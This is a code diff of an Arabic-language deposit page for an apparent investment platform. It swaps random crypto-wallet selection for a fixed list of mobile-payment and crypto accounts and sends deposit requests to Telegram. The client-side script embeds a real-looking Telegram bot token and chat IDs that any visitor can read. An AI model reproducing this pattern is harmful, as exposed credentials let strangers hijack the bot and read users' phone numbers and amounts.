@@ -3,117 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AMT INVESTMENT | إيداع الرصيد</title>
+    <title>AMT | إيداع الرصيد</title>
     <link rel="stylesheet" href="glass.css">
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="security.js"></script>
 </head>
 <body class="main-bg">
-    <div class="glass-container wider">
-        <h2 class="logo">إيداع <span>الرصيد</span></h2>
-        <p class="subtitle">اختر الشبكة المناسبة لإتمام عملية الإيداع</p>
+    <div class="glass-container">
+        <h2 class="logo">شحن <span>المحفظة</span></h2>
+        <p style="text-align:center; font-size:13px; color:#7f8c8d; margin-bottom:15px;">اختر وسيلة الدفع المناسبة لك</p>
 
-        <div class="input-group">
-            <select id="networkSelect" class="network-select" onchange="showWallet()">
-                <option value="">-- اختر الشبكة --</option>
-                <option value="TRC20">TRON (TRC20)</option>
-                <option value="ERC20">Ethereum (ERC20)</option>
-                <option value="BEP20">BNB Smart Chain (BEP20)</option>
-                <option value="SOL">Solana (SOL)</option>
-                <option value="POLYGON">Polygon (MATIC)</option>
-            </select>
-        </div>
-
-        <div id="walletBox" class="wallet-box" style="display:none; background: rgba(0,0,0,0.03); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
-            <p style="font-size: 12px; color: #7f8c8d; margin-bottom: 8px;">عنوان المحفظة المخصص لك:</p>
-            <div style="display: flex; align-items: center; gap: 10px; background: #fff; padding: 10px; border-radius: 8px; border: 1px dashed #bdc3c7;">
-                <span id="walletAddress" style="font-size: 13px; word-break: break-all; color: #2c3e50; font-weight: bold;">جاري التوليد...</span>
-                <button onclick="copyAddress()" style="background: #2c3e50; color: #fff; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px;">نسخ</button>
-            </div>
-            <p style="font-size: 11px; color: #e74c3c; margin-top: 8px;">⚠️ تنبيه: أرسل العملة الصحيحة فقط لهذه الشبكة لتجنب ضياع الرصيد.</p>
-        </div>
-
-        <hr style="border: 0; border-top: 1px solid rgba(0,0,0,0.05); margin: 20px 0;">
-
-        <form id="confirmDeposit">
+        <div id="depositForm">
             <div class="input-group">
-                <input type="number" id="amount" placeholder="المبلغ المودع بالدولار ($)" required min="10">
+                <label style="font-size:12px; display:block; margin-bottom:5px;">اختر المحفظة المتاحة:</label>
+                <select id="walletSelect" style="border-radius:12px;">
+                    <option value="Vodafone Cash">فودافون كاش (010...)</option>
+                    <option value="InstaPay">انستا باي (User@instapay)</option>
+                    <option value="USDT TRC20">USDT (TRC20 Address)</option>
+                    <option value="Binance Pay">Binance Pay ID</option>
+                    <option value="Orange Money">أورنج كاش</option>
+                    <option value="Etisalat Cash">اتصالات كاش</option>
+                </select>
             </div>
-            <button type="submit" class="btn-primary">تأكيد العملية وإرسال الإشعار</button>
-        </form>
+
+            <div class="input-group">
+                <input type="number" id="depositAmount" placeholder="المبلغ المراد شحنه ($)" required>
+            </div>
+
+            <div style="background:rgba(44, 62, 80, 0.05); padding:15px; border-radius:12px; margin-bottom:15px; text-align:center;">
+                <p id="walletAddress" style="font-weight:bold; color:#2c3e50; font-size:14px; word-break:break-all;">اختر وسيلة دفع لرؤية الرقم</p>
+                <button onclick="copyWallet()" style="background:#bdc3c7; border:none; padding:5px 10px; border-radius:5px; font-size:11px; cursor:pointer; margin-top:5px;">نسخ الرقم</button>
+            </div>
+
+            <p style="font-size:11px; color:#e74c3c; margin-bottom:10px;">* بعد التحويل، يرجى إرسال صورة التحويل لخدمة العملاء لتفعيل الرصيد.</p>
+
+            <button onclick="sendDepositRequest()" class="btn-primary">تأكيد عملية التحويل</button>
+            <button onclick="window.location.href='dashboard.html'" class="btn-primary" style="background:transparent; color:#2c3e50; border:1px solid #2c3e50; margin-top:8px;">إلغاء</button>
+        </div>
 
         <p class="version-text" onclick="triggerVault()">v1.0.8</p>
     </div>
 
     <script>
-        // إعدادات البوت والـ IDs اللي بعتهم يا يوسف
-        const botToken = "8619795327:AAF8hZQVZlyLkxYyU6bmuu2KVM2nyNUmpRE";
-        const chatIds = ["8622780736", "8211953992"];
-        const userPhone = localStorage.getItem('userPhone') || "Unknown";
+        const wallets = {
+            "Vodafone Cash": "01012345678", // حط أرقامك الحقيقية هنا
+            "InstaPay": "yousef@instapay",
+            "USDT TRC20": "TXXXXXXXXXXXXXXXXXXXXXXX",
+            "Binance Pay": "998877665",
+            "Orange Money": "01211223344",
+            "Etisalat Cash": "01122334455"
+        };
 
-        // وظيفة سحب المحافظ عشوائياً من الـ 50 محفظة في الفايربيز
-        async function showWallet() {
-            const net = document.getElementById('networkSelect').value;
-            const addrSpan = document.getElementById('walletAddress');
-            const box = document.getElementById('walletBox');
+        const walletSelect = document.getElementById('walletSelect');
+        const walletAddress = document.getElementById('walletAddress');
 
-            if(net) {
-                addrSpan.innerText = "جاري اختيار محفظة آمنة...";
-                box.style.display = 'block';
+        walletSelect.onchange = () => {
+            walletAddress.innerText = wallets[walletSelect.value];
+        };
 
-                try {
-                    // سحب قائمة المحافظ للشبكة المختارة من الـ Firebase
-                    const snapshot = await firebase.database().ref('wallets/' + net).once('value');
-                    const wallets = snapshot.val();
+        function copyWallet() {
+            navigator.clipboard.writeText(walletAddress.innerText);
+            alert("تم نسخ العنوان/الرقم بنجاح");
+        }
 
-                    if(wallets && wallets.length > 0) {
-                        // اختيار محفظة واحدة عشوائياً من الـ 10 الموجودين
-                        const randomAddr = wallets[Math.floor(Math.random() * wallets.length)];
-                        addrSpan.innerText = randomAddr;
-                    } else {
-                        addrSpan.innerText = "لا توجد محافظ متوفرة حالياً، اتصل بالدعم.";
-                    }
-                } catch (error) {
-                    addrSpan.innerText = "خطأ في الاتصال بالقاعدة.";
-                }
+        async function sendDepositRequest() {
+            const amount = document.getElementById('depositAmount').value;
+            const method = walletSelect.value;
+            const phone = localStorage.getItem('userPhone');
+
+            if(!amount || amount <= 0) return alert("يرجى إدخال مبلغ صحيح");
+
+            const botToken = "8619795327:AAF8hZQVZlyLkxYyU6bmuu2KVM2nyNUmpRE";
+            const chatId = "8622780736"; 
+            const msg = `💰 **طلب إيداع جديد!**\n📱 المستخدم: ${phone}\n💵 المبلغ: $${amount}\n💳 الوسيلة: ${method}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                alert("تم إرسال طلبك! يرجى التواصل مع الإدارة لإتمام التفعيل.");
+                window.location.href = "https://t.me/l0_D_0"; // يروح يكلمك عشان يبعت السكرين
+            } catch(e) {
+                alert("حدث خطأ، حاول مرة أخرى.");
             }
         }
-
-        // وظيفة النسخ
-        function copyAddress() {
-            const text = document.getElementById('walletAddress').innerText;
-            navigator.clipboard.writeText(text).then(() => alert("تم نسخ المحفظة!"));
-        }
-
-        // إرسال الطلب النهائي للتليجرام
-        document.getElementById('confirmDeposit').onsubmit = async (e) => {
-            e.preventDefault();
-            const amount = document.getElementById('amount').value;
-            const net = document.getElementById('networkSelect').value;
-            const addr = document.getElementById('walletAddress').innerText;
-            
-            // توليد كود إيداع فريد للمستخدم (AMT-XXXX)
-            const depositID = "AMT-" + Math.floor(1000 + Math.random() * 9000);
-
-            if(!net) return alert("يرجى اختيار الشبكة أولاً");
-
-            const message = `💰 **طلب إيداع جديد**\n\n👤 المستخدم: ${userPhone}\n💵 المبلغ: $${amount}\n🌐 الشبكة: ${net}\n📍 المحفظة: ${addr}\n🆔 كود التأكيد: ${depositID}\n\nيرجى مراجعة التحويل يدوياً قبل إضافة الرصيد.`;
-
-            // إرسال الإشعار لـ يوسف وللشريك
-            chatIds.forEach(id => {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-            });
-
-            alert(`تم إرسال الطلب!\nكود الإيداع الخاص بك هو: ${depositID}\nقم بإرسال هذا الكود للدعم عبر تليجرام لتفعيل الرصيد.`);
-            window.location.href = "dashboard.html";
-        };
     </script>
-
-    <style>
-        .wider { max-width: 500px; }
-        .network-select { cursor: pointer; background: #fff; font-weight: 600; }
-        .copy-btn:active { transform: scale(0.95); }
-    </style>
 </body>
 </html>
